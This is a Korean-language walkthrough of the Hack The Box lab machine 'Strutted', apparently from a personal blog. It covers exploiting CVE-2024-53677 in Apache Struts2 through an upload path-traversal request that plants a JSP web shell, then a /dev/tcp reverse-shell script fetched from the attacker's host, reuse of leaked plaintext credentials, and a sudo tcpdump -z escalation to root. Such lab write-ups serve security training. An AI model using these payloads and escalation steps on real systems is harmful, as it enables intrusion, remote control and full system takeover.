---
title: "Strutted (Medium)"
date: 2025-12-19
layout: single
excerpt: "Strutted는 중간 난이도의 Linux 머신으로, 웹사이트에서 제공되는 Docker 컨테이너에는 CVE-2024-53677 취약점이 존재하는 Apache Struts 버전이 포함되어 있으며, 해당 취약점을 악용해 시스템에 초기 접근(foothold) 을 획득할 수 있다. 이후 추가적인 열거 과정을 통해 tomcat-users.xml 파일을 발견하게 되며, 해당 파일에 저장된 평문 비밀번호를 이용해 james 사용자 계정으로 인증할 수 있다. 이후 sudo 권한으로 실행 가능한 tcpdump를 악용한다. tcpdump 의 -z 옵션을 악용하여 /bin/bash 바이너리에 SUID 비트를 설정하고, 이를 통해 최종적으로 루트 권한을 탈취할 수 있다."
author_profile: true
toc: true
toc_label: "Strutted"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/strutted/strutted.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, linux, web, nginx, apache-struts, struts2, cve-2024-53677, rce, file-upload, path-traversal, ognl, information-disclosure, credentials-leak, ssh, sudo, tcpdump, priv-esc]
---

![Strutted](/assets/htb-linux/strutted/strutted.png)

**Strutted**는 중간 난이도의 Linux 머신으로, 웹사이트에서 제공되는 Docker 컨테이너에는 **CVE-2024-53677 취약점이 존재하는 Apache Struts 버전이 포함**되어 있다. 해당 취약점을 악용해 시스템에 대한 초기 접근(`foothold`)을 획득할 수 있다.

이후 추가적인 열거 과정을 통해 `tomcat-users.xml` 파일을 발견하게 되며, 해당 파일에 저장된 **평문 비밀번호**를 이용해 `james` 사용자 계정으로 인증할 수 있다.

권한 상승 단계에서는 `sudo` 권한으로 실행 가능한 `tcpdump` 를 악용한다. `tcpdump` 의 `-z` 옵션을 악용하여 `/bin/bash` 바이너리에 **SUID 비트를 설정**하고, 이를 통해 최종적으로 루트 권한을 탈취할 수 있다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.12.90`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.12.90 | tee nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 22:06 EST
Nmap scan report for 10.129.12.90
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.59 seconds
```

Nmap 스캔 결과 `SSH(22)`, `HTTP(80)` 서비스가 열려 있으며, HTTP 서비스는 `nginx 1.18.0` 기반으로 동작하고 있다.

웹 사이트 접근 시 **strutted.htb** 도메인으로 접근해야 함을 확인했다.

---

# Vulnerability Analysis

웹 사이트에 접속하면 아래와 같이 이미지를 업로드할 수 있는 기능이 제공되는 것을 확인할 수 있다:

![Strutted](/assets/htb-linux/strutted/website.png)

`Download` 버튼을 클릭하면, 웹 애플리케이션의 소스 코드가 포함된 ZIP 파일을 다운로드할 수 있는 기능이 존재한다.

## Source Code Analysis

ZIP 파일의 압축을 해제하면 다음과 같은 파일들이 확인된다:

```bash
$ ls -l 

-rw-r--r-- 1 kali kali     1361 Jan  7  2025 context.xml
-rw-r--r-- 1 kali kali      615 Jan  7  2025 Dockerfile
-rw-r--r-- 1 kali kali     4064 Jan  7  2025 README.md
drwxr-xr-x 4 kali kali     4096 Jan  7  2025 strutted
-rw-r--r-- 1 kali kali      222 Jan  7  2025 tomcat-users.xml
```

이 중 `tomcat-users.xml` 파일에는 `Tomcat` 관리자 계정의 자격 증명이 평문으로 저장되어 있다:

```xml
<?xml version='1.0' encoding='utf-8'?>

<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

다만, 해당 자격 증명은 `Tomcat Manager` 인터페이스가 외부에 노출되어 있지 않아, 현재 단계에서는 직접적인 공격에 활용할 수 없었다.

`strutted` 디렉토리로 이동하면 다음과 같은 파일 및 디렉토리가 존재함을 확인할 수 있다:

```bash
$ ls -l

-rw-r--r-- 1 kali kali 9113 Jan  7  2025 mvnw
-rw-r--r-- 1 kali kali 5810 Jan  7  2025 mvnw.cmd
-rw-r--r-- 1 kali kali 3999 Jan  7  2025 pom.xml
drwxr-xr-x 3 kali kali 4096 Jan  7  2025 src
drwxr-xr-x 7 kali kali 4096 Jan  7  2025 target
```

이 중 `pom.xml` 파일을 확인하면, 애플리케이션에서 사용 중인 프레임워크의 버전 정보를 확인할 수 있다:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

<!-- SKIP -->

    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <struts2.version>6.3.0.1</struts2.version>
        <jetty-plugin.version>9.4.46.v20220331</jetty-plugin.version>
        <maven.javadoc.skip>true</maven.javadoc.skip>
        <jackson.version>2.14.1</jackson.version>
        <jackson-data-bind.version>2.14.1</jackson-data-bind.version>
    </properties>
```

위 설정을 통해, 해당 웹 애플리케이션에서 사용 중인 **Apache Struts2의 버전**이 `6.3.0.1` 임을 확인할 수 있다.

## Apache Struts2 RCE (CVE-2024-53677)

앞서 확인한 Apache Struts2 버전 `6.3.0.1` 은 [CVE-2024-53677](https://www.sonicwall.com/ko-kr/blog/apache-struts-path-traversal-to-rce-cve-2024-53677) 취약점의 영향을 받는 것으로 알려져 있다.

해당 취약점은 파일 업로드 처리 과정에서 발생하는 **Path Traversal을 통한 원격 코드 실행(`Remote Code Execution`)** 을 허용한다.

현재 해당 버전에서는 [FileUploadInterceptor](https://struts.apache.org/core-developers/file-upload-interceptor) 라는 파일 업로드 메커니즘을 사용한다.

이 매커니즘은 업로드 된 각 파일에 대해 3가지 파라미터를 자동으로 제공해 준다:

```text
<file name>: File - the actual File
<file name>ContentType: String - the content type of the file
<file name>FileName: String - the actual name of the file uploaded (not the HTML name)
```

이 중 `<file name>FileName` 파라미터는 업로드 파일의 최종 파일명을 의미하며, **Struts2의 OGNL ValueStack 특성상 요청 파라미터가 최상단 객체에 바인딩**되기 때문에 `top.<file name>FileName` 형태로도 값을 주입할 수 있다:

```text
--bb271d30c09e8187fb5a8e60846e316e
Content-Disposition: form-data; name="Upload"; filename="image.png"
Content-Type: image/png


--bb271d30c09e8187fb5a8e60846e316e
Content-Disposition: form-data; name="top.UploadFileName"

../../image.jsp
--bb271d30c09e8187fb5a8e60846e316e--
```

이처럼 `top.UploadFileName` 을 `../../image.jsp` 와 같이 지정하면, 업로드 요청 자체는 `image.png` 로 전송되더라도 서버 측 저장 과정에서 최종 파일명이 `image.jsp` 로 처리될 수 있다. 

따라서 공격자는 업로드되는 **파일 내용에 JSP 코드를 포함**시키고, 해당 파일이 웹 서버에서 실행 가능한 경로에 저장되도록 유도하여 원격 코드 실행(`RCE`) 으로 이어지게 할 수 있다.

---

# Exploitation

## Malicious File Upload

ZIP으로 다운로드한 소스 코드 중 `/strutted/src/main/java/org/strutted/htb` 경로의 `Upload.java` 파일을 확인하면, 업로드되는 파일에 대해 이미지 타입 검증을 수행하는 로직이 존재함을 확인할 수 있다:

```java
private boolean isImageByMagicBytes(File file) {
    byte[] header = new byte[8];
    try (InputStream in = new FileInputStream(file)) {
        int bytesRead = in.read(header, 0, 8);
        if (bytesRead < 8) {
            return false;
        }

        // JPEG
        if (header[0] == (byte)0xFF && header[1] == (byte)0xD8 && header[2] == (byte)0xFF) {
            return true;
        }

        // PNG
        if (header[0] == (byte)0x89 && header[1] == (byte)0x50 && header[2] == (byte)0x4E && header[3] == (byte)0x47) {
            return true;
        }

        // GIF (GIF87a or GIF89a)
        if (header[0] == (byte)0x47 && header[1] == (byte)0x49 && header[2] == (byte)0x46 &&
            header[3] == (byte)0x38 && (header[4] == (byte)0x37 || header[4] == (byte)0x39) && header[5] == (byte)0x61) {
            return true;
        }

    } catch (Exception e) {
        e.printStackTrace();
    }

    return false;
}
```

PNG 파일 검증을 우회하기 위해, **PNG 매직 바이트만을 포함하는 1×1 크기의 검은색 PNG 파일**을 생성하였다:

```bash
$ convert -size 1x1 xc:black -strip shell.png
```

이후 `upload.action` 엔드포인트로 POST 요청을 전송하여 PNG 파일을 업로드하고, **OGNL 기반 파라미터 주입을 위해 두 번째 파라미터로 `top.UploadFileName` 값을 추가**하였다.

이때 첫 번째 파일 업로드 파라미터를 기본적인 `upload` 로 지정할 경우, **Struts2의 OGNL ValueStack 상에서 해당 값이 정상적으로 바인딩되지 않아** `top.<file name>FileName` 형태의 조작이 불가능하였다.

따라서 파일 업로드 파라미터 값을 **대문자 U를 포함한 `Upload` 로 지정하여 요청을 구성**하였으며, 그 결과 `top.UploadFileName` 파라미터가 정상적으로 처리되어 업로드된 파일의 최종 파일명이 `test.jsp` 로 변경되는 것을 확인할 수 있었다:

![Strutted](/assets/htb-linux/strutted/success.png)

이후 [RCE용 JSP 웹쉘](https://gist.github.com/nikallass/5ceef8c8c02d58ca2c69a29a92d2f461)을 업로드하여 `cmd.jsp` 파일로 저장하였다.

아래와 같이 `id` 명령어 실행을 통해 원격 코드 실행(RCE) 이 정상적으로 이루어짐을 확인하였다:

![Strutted](/assets/htb-linux/strutted/web-shell.png)

## Obtaining a Reverse Shell

해당 [블로그](https://sra.io/blog/a-smaller-better-jsp-web-shell/)에선 JSP는 PHP와 달리 쉘 리다이렉션(`>`, `>>`, `|`) 같은 쉘 문법이 정상적으로 처리되지 않음을 언급하고 있다.

이에 따라 웹쉘을 통해 직접 실행하는 대신, 로컬 환경에서 `bash -c` 기반 페이로드를 작성한 뒤 이를 서버로 전달하여 실행하는 방식을 사용하였다.

우선 실행할 명령을 스크립트로 분리하여, 로컬에서 `shell.sh` 파일을 생성하였다:

```bash
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.76/9001 0>&1"
```

이후 `wget` 을 이용해 로컬에서 작성한 `shell.sh` 파일을 대상 시스템의 `/tmp` 디렉토리에 다운로드하였다:

![Strutted](/assets/htb-linux/strutted/shell-upload.png)

웹쉘에서 `Send` 버튼을 클릭하면, 로컬에서 실행 중이던 `python3` HTTP 서버 로그를 통해 파일이 정상적으로 요청 및 다운로드되었음을 확인할 수 있다:

```bash
$ python3 -m http.server

10.129.12.90 - - [20/Dec/2025 15:02:48] "GET /shell.sh HTTP/1.1" 200 -
```

이후 웹쉘을 통해 `/tmp/shell.sh` 파일에 실행 권한을 부여하였다:

![Strutted](/assets/htb-linux/strutted/chmod.png)

리버스 셸 수신을 위해 로컬 터미널에서 `netcat` 리스너를 실행한 뒤:

```bash
$ nc -lvnp 9001
```

웹쉘에서 `/tmp/shell.sh` 스크립트를 실행한 결과, 성공적으로 `tomcat` 사용자 권한의 셸을 획득하였다:

![Strutted](/assets/htb-linux/strutted/tomcat-shell.png)

---

# Privilege Escalation

## Lateral Movement: tomcat → james

### Enumerating Users and Credentials

현재 시스템의 사용자 정보를 확인한 결과, `/etc/passwd` 파일에서 `james` 사용자가 **Network Administrator**로 설정되어 있음을 확인할 수 있다:

```bash
james:x:1000:1000:Network Administrator:/home/james:/bin/bash                                                                                  
root:x:0:0:root:/root:/bin/bash
```

이후 추가적인 열거 과정에서 `/etc/tomcat9` 디렉토리 내 `tomcat-users.xml` 파일을 확인하였으며,
해당 파일에서 **admin 계정의 평문 자격 증명이 주석 형태로 노출**되어 있는 것을 확인하였다:

```xml
<!-- SKIP -->

<!--
    <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
    <user username="robot" password="<must-be-changed>" roles="manager-script"/>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/>
-->
```

`admin` 계정의 자격 증명이 시스템 내에 평문으로 저장되어 있는 점을 근거로, 동일한 비밀번호가 시스템 사용자 계정에서도 재사용되었을 가능성을 의심하였다.

이에 따라 해당 자격 증명을 이용해 `james` 계정으로 SSH 인증을 시도하였으며, 그 결과 정상적으로 셸을 획득할 수 있었다:

```bash
$ sshpass -p IT14d6SSP81k ssh james@10.129.12.90

james@strutted:~$
```

## Lateral Movement: james → root

### Enumerating sudo Privileges

`sudo -l` 명령어를 통해 `james` 사용자가 수행할 수 있는 권한을 확인한 결과, 다음과 같이 출력되었다:

```bash
james@strutted:~$ sudo -l

Matching Defaults entries for james on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

위 결과를 통해 `james` 사용자는 비밀번호 입력 없이 `root` 권한으로 `/usr/sbin/tcpdump` 명령어를 실행할 수 있음을 확인하였다.

### Abusing tcpdump Sudo Privilege

> [TCPDump 관련 권한 상승](https://cheats.philkeeble.com/linux/local-privilege-escalation#tcpdump) 을 참고하여 수행하였다.

`sudo tcpdump -ln -i eth0 -w /dev/null -G 1 -W 1 -z /tmp/elevate -Z root` 명령어에 사용된 옵션들을 분석한 결과,
해당 명령은 내부적으로 패킷 캡처를 수행한 뒤 캡처 파일 로테이션 시점에 후처리 작업을 실행한다.

이 과정에서 `-G 1` 옵션은 1초마다 캡처를 로테이션 하도록 설정하여, 후처리 명령이 자동으로 트리거되도록 한다.

이때 `-Z root` 옵션을 통해 tcpdump가 패킷 캡처 이후에도 권한을 드롭하지 않도록 설정하며, `-z` 옵션에 지정된 파일이 `execve()` 를 통해 `root` 권한으로 실행된다.

`-z` 옵션에 사용할 후처리 스크립트를 생성하였다:

```bash
james@strutted:~$ echo 'chmod +s /bin/bash' > /tmp/shell
```

생성한 스크립트에 실행 권한을 부여하였다:

```bash
james@strutted:~$ chmod +x /tmp/shell
```

이후 tcpdump 실행 시 `-z` 옵션에 해당 스크립트를 지정하고, `-Z root` 옵션을 통해 tcpdump가 캡처 이후에도 권한을 드롭하지 않도록 설정하였다:

```bash
james@strutted:~$ sudo /usr/sbin/tcpdump -i eth0 -w /dev/null -G 1 -W 1 -z /tmp/shell -Z root

tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
5 packets received by filter
0 packets dropped by kernel
```

`-G 1` 옵션으로 인해 캡처 파일이 로테이션되며, 이 과정에서 `-z` 옵션에 지정된 스크립트가 `root` 권한으로 실행된다.

이후 `/bin/bash` 파일의 권한을 확인한 결과 SUID 비트가 설정된 것을 확인할 수 있다:

```bash
james@strutted:~$ ls -l /bin/bash

-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

마지막으로 `/bin/bash` 를 `-p` 옵션과 함께 실행하여, 루트 셸 획득에 성공하였다:

```bash
james@strutted:~$ /bin/bash -p

bash-5.1#
```

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다:

![Strutted](/assets/htb-linux/strutted/flag.png)














